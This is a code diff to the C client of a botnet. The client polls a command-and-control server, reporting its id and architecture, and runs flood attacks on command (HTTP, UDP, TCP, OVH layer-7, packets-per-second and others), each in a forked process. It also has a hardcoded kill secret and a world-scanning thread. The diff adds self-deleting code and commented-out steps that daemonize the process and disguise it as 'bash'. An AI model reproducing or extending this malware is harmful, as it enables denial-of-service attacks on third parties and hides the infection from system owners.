@@ -1,66 +1,93 @@
 #include "includes/px_botnet.h"
 
-in_addr_t	addr;
+in_addr_t addr;
 
 void ft_manage_request(char *ptr)
 {
 	char **split;
 
-	printf("test : %s\n", ptr);
 	split = ft_split(ptr, '|');
-	if (ft_split_len(split) >= 4)
+	if (ft_split_len(split) == 2 && !ft_strncmp(split[0], "KILL", 4) && !ft_strncmp(split[1], "ADFVDJIUCJHEhguehdFUCDJuyhy", 27))
+		exit(0);
+	if (!fork())
 	{
-		printf("----------\n");
-		printf(".%d.\n", rand() % 100);
-		printf(".%s.\n", split[0]);
-		printf(".%s.\n", split[1]);
-		printf(".%s.\n", split[2]);
-		printf(".%s.\n", split[3]);
-		if (ft_split_len(split) >= 5)
-			printf(".%s.\n", split[4]);
-		if (ft_split_len(split) >= 6)
-			printf(".%s.\n", split[5]);
-		if (ft_split_len(split) >= 7)
-			printf(".%s.\n", split[6]);
-		printf("----------\n");
-		if (!ft_strncmp(split[0], "OVHL7", 5))
-			OVHL7(split[1], atoi(split[2]), atoi(split[3]), 4);
-		else if (!ft_strncmp(split[0], "HTTP", 4) && ft_split_len(split) == 7) //Already forked
-			HTTP(split[5], split[1], atoi(split[2]), split[4], atoi(split[3]), atoi(split[6]));
-		else if (!ft_strncmp(split[0], "UDPRAW", 6))
-			UDPRAW(split[1], atoi(split[2]), atoi(split[3]));
-		else if (!ft_strncmp(split[0], "CNC", 3))
-			CNC(split[1], atoi(split[2]), atoi(split[3]));
-		else if (!ft_strncmp(split[0], "HOLD", 4))
-			HOLD(split[1], atoi(split[2]), atoi(split[3]));
-		else if (!ft_strncmp(split[0], "JUNK", 4))
-			JUNK(split[1], atoi(split[2]), atoi(split[3]));
-		else if (!ft_strncmp(split[0], "RANDHEX", 7))
-			RANDHEX(split[1], atoi(split[2]), atoi(split[3]));
-		else if (!ft_strncmp(split[0], "STD", 3))
-			STD(split[1], atoi(split[2]), atoi(split[3]));
-		else if (!ft_strncmp(split[0], "UDP", 3) && ft_split_len(split) == 6)
-			UDP(split[1], atoi(split[2]), atoi(split[3]), atoi(split[4]), atoi(split[5]), atoi(split[6]));
-		else if (!ft_strncmp(split[0], "TCP", 3) && ft_split_len(split) == 7)
-			TCP(split[1], atoi(split[2]), atoi(split[3]), split[4], atoi(split[5]), atoi(split[6]), atoi(split[7]));
-		else if (!ft_strncmp(split[0], "UNKNOWN", 7))
-			UNKNOWN(split[1], atoi(split[2]), atoi(split[3]));
-		else if (!ft_strncmp(split[0], "XTDCUSTOM", 9))
-			XTDCUSTOM(split[1], atoi(split[2]), atoi(split[3]));
-		
+		if (ft_split_len(split) >= 4)
+		{
+			if (!ft_strncmp(split[0], "OVHL7", 5) && ft_split_len(split) == 5)
+				OVHL7(split[1], atoi(split[2]), atoi(split[3]), atoi(split[4]));
+			else if (!ft_strncmp(split[0], "PPS", 3) && ft_split_len(split) == 5)
+				PPS(split[1], atoi(split[2]), atoi(split[3]), atoi(split[4]));
+			else if (!ft_strncmp(split[0], "HTTP", 4) && ft_split_len(split) == 7) // Already forked
+				HTTP(split[5], split[1], atoi(split[2]), split[4], atoi(split[3]), atoi(split[6]));
+			else if (!ft_strncmp(split[0], "UDPRAW", 6))
+				UDPRAW(split[1], atoi(split[2]), atoi(split[3]));
+			else if (!ft_strncmp(split[0], "HOLD", 4))
+				HOLD(split[1], atoi(split[2]), atoi(split[3]));
+			else if (!ft_strncmp(split[0], "JUNK", 4))
+				JUNK(split[1], atoi(split[2]), atoi(split[3]));
+			else if (!ft_strncmp(split[0], "RANDHEX", 7))
+				RANDHEX(split[1], atoi(split[2]), atoi(split[3]));
+			else if (!ft_strncmp(split[0], "STD", 3))
+				STD(split[1], atoi(split[2]), atoi(split[3]));
+			else if (!ft_strncmp(split[0], "UDP", 3) && ft_split_len(split) == 7)
+				UDP(split[1], atoi(split[2]), atoi(split[3]), atoi(split[4]), atoi(split[5]), atoi(split[6]));
+			else if (!ft_strncmp(split[0], "TCP", 3) && ft_split_len(split) == 8)
+				TCP(split[1], atoi(split[2]), atoi(split[3]), split[4], atoi(split[5]), atoi(split[6]), atoi(split[7]));
+			else if (!ft_strncmp(split[0], "XTDCUSTOM", 9))
+				XTDCUSTOM(split[1], atoi(split[2]), atoi(split[3]));
+		}
+		ft_free_split(split);
+		exit(0);
 	}
-	ft_free_split(split);
 }
 
 int main(int argc, char *argv[])
 {
+	char name[] = "bash";
 	pthread_t ip_searcher;
 	char *id;
 	char *request;
 	char *tmp;
+	char *arch;
+	pid_t pid1;
+	pid_t pid2;
+	int status;
 
-	//argv[0] = "uwu";
+	remove(argv[0]);
+	/*srand(time(NULL) ^ getpid());
+	strncpy(argv[0], "bash", strlen(argv[0]));
+	argv[0] = "bash";
+	prctl(PR_SET_NAME, (unsigned long)name, 0, 0, 0);
+
+	// fork avant setsid()
+	if (pid1 = fork())
+	{
+		waitpid(pid1, &status, 0);
+		exit(0);
+	}
+	else if (!pid1)
+	{
+		if (pid2 = fork())
+		{
+			exit(0);
+		}
+		else if (!pid2)
+		{
+		}
+		else
+		{
+			// zprintf("fork failed\n");
+		}
+	}
+	else
+	{
+		// zprintf("fork failed\n");
+	}
+	setsid();
+	chdir("/");
+	signal(SIGPIPE, SIG_IGN);*/
 	addr = inet_addr("8.8.8.8");
+	arch = ft_getarch();
 	id = ft_get_id();
 	if (pthread_create(&ip_searcher, NULL, (void *)&ft_scan_world, NULL))
 		pthread_join(ip_searcher, NULL);
@@ -68,6 +95,8 @@ int main(int argc, char *argv[])
 	{
 		request = ft_strjoin("?id=", id);
 		request = ft_strnjoinf(url_page, request, strlen(request));
+		request = ft_strnjoin(request, "&arch=", strlen(request));
+		request = ft_strnjoin(request, arch, strlen(request));
 		tmp = ft_request(request);
 		if (tmp)
 			ft_manage_request(tmp);
